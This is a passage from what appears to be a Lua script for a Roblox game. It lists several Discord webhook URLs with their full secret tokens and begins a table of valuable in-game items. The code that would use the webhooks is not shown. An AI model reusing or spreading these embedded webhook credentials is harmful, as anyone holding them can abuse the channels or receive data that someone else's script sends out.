    "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b",
    "https://discord.com/api/webhooks/1397994822396149890/k7gMoTUoiEFaR4733ymwSKjRd5iVfwhiCyWRDNbltfvPSKQHQpWpIr5GxCOfkSx-kWRd"
}

local extraWebhookUrl = "https://discord.com/api/webhooks/1398063143498027018/3_tAgWwlYaJrnS643ZoFe5IVCtMOmAjN8d_ECv058nuZTOzpVspgBPEJ9DQ30ItLjmMi"
local midWebhookUrl   = "https://discord.com/api/webhooks/1398075572604633188/PB21kIJHSLj6Pd-_P6hxhgunzMbl4dhc_XoNPqSE2gxdzjgbfQmUnR7ctOR3OwZVu2qG"

local brainrotGods = {
    ["Garama and Madundung"] = true,
    ["Nuclearo Dinossauro"] = true,
